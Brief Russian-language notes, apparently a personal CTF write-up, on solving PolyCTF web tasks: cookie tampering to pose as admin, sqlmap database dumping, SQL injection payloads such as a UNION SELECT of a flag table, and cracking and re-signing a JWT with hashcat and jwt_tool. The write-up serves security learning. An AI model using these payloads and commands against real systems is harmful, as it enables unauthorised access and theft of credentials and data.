Task2 "Чтобы получить флаг, отправьте запрос с get-параметром name: PolyCTF и post-параметром flag: yep" ![[Pasted image 20250205115558.png]]

Task 3. Выставляем Cookie: username=admin и получаем флаг

task 4. брут code

task 5. sqlmap (hard and all) Выдал данные из базы, в том числе пароли и флаг
![[Pasted image 20250205170814.png]]
-8409 OR 4979=4979 - генерирует запросы для всех купонов
-1 UNION SELECT fl4g FROM s3cret - позволяет вытащить флаг (если знать название таблицы с колонок)

task 6. Изменение значения в репиторе 

task 7 . Получаем jwt токен из запроса eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.KVcwu6cwfsOQXQooeH7-S0j__1NwteG-9jFZ63aApe0 ![[Pasted image 20250205201706.png]]
Через hashcat (hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt ) получаем закрытый ключ IC3QU33NS

С помощью jwt_tool (https://github.com/ticarpi/jwt_tool) изменяем данные в токене ```
python3 jwt_tool.py -T -p IC3QU33NS  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.KVcwu6cwfsOQXQooeH7-S0j__1NwteG-9jFZ63aApe0 -S hs256```
![[Pasted image 20250205202008.png]]

Полученный токен отправляем через repeator и получаем флаг
![[Pasted image 20250205202037.png]]
